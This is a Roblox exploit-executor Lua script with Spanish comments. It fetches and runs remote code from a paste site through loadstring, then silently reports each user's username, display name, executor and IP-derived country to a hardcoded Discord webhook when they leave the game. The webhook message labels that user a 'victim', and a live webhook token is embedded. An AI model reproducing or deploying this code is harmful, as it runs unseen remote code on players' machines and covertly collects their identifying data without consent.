-- ========================================
-- Ejecutar solo una vez
-- ========================================
if getgenv().EjecutarsePrimero then return end
getgenv().EjecutarsePrimero = true

-- ========================================
-- SCRIPT PRINCIPAL (LOADSTRING)
-- ========================================
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()

-- ========================================
-- SISTEMA DE WEBHOOK ULTRA VIP DOBLE IMAGEN
-- ========================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"

-- Imagen del embed (grande)
local mainImageURL = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"
-- Portada del jugador (thumbnail)
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"

-- Detectar executor
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

-- Detectar país automáticamente
local function detectCountry()
    local country = "Desconocido"
    local services = {
        "https://ipapi.co/json",
        "https://ipinfo.io/json",
        "https://freegeoip.app/json/",
        "https://www.geoplugin.net/json.gp",
        "https://ipwhois.app/json/"
    }
    for _, url in ipairs(services) do
        pcall(function()
            local response = HttpService:GetAsync(url)
            if response then
                local data = HttpService:JSONDecode(response)
                if data then
                    if data.country_name then country = data.country_name
                    elseif data.country then country = data.country
                    elseif data.geoplugin_countryName then country = data.geoplugin_countryName
                    end
                end
            end
        end)
        if country ~= "Desconocido" then break end
    end
    return country
end
local countryName = detectCountry()

-- Función para enviar webhook ultra VIP doble imagen
local function SendExitWebhook()
    local colors = {16711680, 16753920, 16776960, 65280, 255} -- rojo, naranja, amarillo, verde, azul
    local fields = {
        {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
        {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
        {["name"]="🌎 País", ["value"]=countryName, ["inline"]=true},
        {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
        {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
        {["name"]="🔗 Imagen embed", ["value"]="[Click aquí]("..mainImageURL..")", ["inline"]=false}
    }

    local embedFields = {}
    for _, f in ipairs(fields) do
        table.insert(embedFields, {["name"]=f.name, ["value"]=f.value, ["inline"]=f.inline})
    end

    local data = {
        ["username"] = "🚨 Sistema VIP Roblox",
        ["avatar_url"] = mainImageURL, -- imagen principal del webhook
        ["content"] = "**🚨⚠️ ¡Víctima se salió del servidor! ⚠️🚨**",
        ["embeds"] = {{
            ["title"] = "🎮 Panel de Salida - VIP Dashboard",
            ["description"] = "Información capturada automáticamente con doble imagen:",
            ["color"] = 16729344,
            ["thumbnail"] = {["url"] = avatarUrl}, -- portada del jugador
            ["image"] = {["url"] = mainImageURL}, -- imagen grande
            ["fields"] = embedFields,
            ["footer"] = {["text"] = "Sistema de Salida • " .. os.date("%d/%m/%Y")}
        }}
    }

    local FinalData = HttpService:JSONEncode(data)
    request = request or http_request or syn.request
    if request then
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = FinalData
        })
    end
end

-- Detectar salida del jugador
LocalPlayer.AncestryChanged:Connect(function(_, parent)
    if not parent then
        SendExitWebhook()
    end
end)

-- Detectar cierre del juego
game:BindToClose(function()
    SendExitWebhook()
end)
